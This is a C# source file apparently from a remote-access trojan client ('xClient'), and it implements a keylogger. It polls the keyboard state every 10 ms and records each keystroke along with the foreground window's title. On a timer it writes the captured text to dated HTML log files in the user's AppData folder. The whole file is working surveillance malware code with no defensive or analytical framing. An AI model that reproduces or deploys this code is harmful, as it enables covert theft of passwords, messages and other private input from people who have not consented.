using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace xClient.Core
{
    public class Logger
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetKeyboardLayout(uint threadId);

        public bool Enabled
        {
            get
            {
                return timerLogKeys.Enabled && timerFlush.Enabled;
            }
            set
            {
                timerLogKeys.Enabled = timerFlush.Enabled = value;
            }
        }

        public static bool ShiftKey
        {
            get
            {
                return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000);
            }
        }

        public static bool CapsLock
        {
            get
            {
                return Control.IsKeyLocked(Keys.CapsLock);
            }
        }

        private string keyBuffer;
        private string hWndTitle;
        private string hWndLastTitle;
        private string filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";

        private bool firstWrite = false;

        private List<int> enumValues;

        private IntPtr activeKeyboardLayout;

        private System.Timers.Timer timerLogKeys;
        private System.Timers.Timer timerFlush;

        public Logger(double flushInterval)
        {
            hWndLastTitle = "";

            WriteFile();

            #region KeyEnumValues
            enumValues = new List<int>()
            {
               8,
               9,
               13,
               20,
               32,
               46,
            };

            for (int i = 48; i <= 57; i++)
            {
                enumValues.Add(i);
            }

            for (int i = 65; i <= 122; i++)
            {
                if (i == 91 || i == 92)
                    continue;

                enumValues.Add(i);
            }

            for (int i = 186; i <= 192; i++)
            {
                enumValues.Add(i);
            }

            for (int i = 219; i <= 222; i++)
            {
                enumValues.Add(i);
            }
            #endregion

            this.timerLogKeys = new System.Timers.Timer();
            this.timerLogKeys.Enabled = false;
            this.timerLogKeys.Elapsed += new System.Timers.ElapsedEventHandler(this.timerLogKeys_Elapsed);
            this.timerLogKeys.Interval = 10;

            this.timerFlush = new System.Timers.Timer();
            this.timerFlush.Enabled = false;
            this.timerFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerFlush_Elapsed);
            this.timerFlush.Interval = flushInterval;
        }

        private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            hWndTitle = GetActiveWindowTitle();

            activeKeyboardLayout = GetActiveKeyboardLayout();

            foreach (int i in enumValues)
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    if (hWndTitle != null)
                    {
                        if (hWndTitle != hWndLastTitle)
                        {
                            hWndLastTitle = hWndTitle;

                            keyBuffer += "<br><br>[<b>" + hWndTitle + "</b>]<br>";
                        }
                    }

                    switch (i)
                    {
                        case 8:
                            keyBuffer += "<font color=\"0000FF\">[Back]</font>";
                            return;
                        case 9:
                            keyBuffer += "<font color=\"0000FF\">[Tab]</font>";
                            return;
                        case 13:
                            keyBuffer += "<font color=\"0000FF\">[Enter]</font><br>";
                            return;
                        case 32:
                            keyBuffer += " ";
                            return;
                        case 46:
                            keyBuffer += "<font color=\"0000FF\">[Del]</font>";
                            return;
                    }

                    if (enumValues.Contains(i))
                    {
                        if (ShiftKey && CapsLock)
                        {
                            keyBuffer += FromKeys(i, true, true);
                            return;
                        }
                        else if (ShiftKey)
                        {
                            keyBuffer += FromKeys(i, true, false);
                            return;
                        }
                        else if (CapsLock)
                        {
                            keyBuffer += FromKeys(i, false, true);
                            return;
                        }
                        else
                        {
                            keyBuffer += FromKeys(i, false, false);
                            return;
                        }
                    }
                }
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (keyBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(filePath))
                    Directory.CreateDirectory(filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (keyBuffer != "")
                                    sw.Write(keyBuffer);

                                hWndLastTitle = "";
                            }
                            else
                                sw.Write(keyBuffer);
                        }
                        catch
                        { }
                    }
                }
            }
            catch
            { }

            keyBuffer = "";
        }

        private string GetActiveWindowTitle()
        {
            IntPtr hwnd = GetForegroundWindow();

            StringBuilder sbTitle = new StringBuilder(1024);

            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != "" ? title : null;
        }

        private IntPtr GetActiveKeyboardLayout()
        {
            IntPtr hWnd = GetForegroundWindow();

            uint pid;

            return GetKeyboardLayout(GetWindowThreadProcessId(hWnd, out pid));
        }

        private char? FromKeys(int keys, bool shift, bool caps)
        {
            var keyStates = new byte[256];

            if (shift)
                keyStates[16] = 0x80;
            if (caps)
                keyStates[20] = 0x01;

            var sb = new StringBuilder(10);

            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, activeKeyboardLayout) == 1 ? (char?)sb[0] : null;
        }
    }
}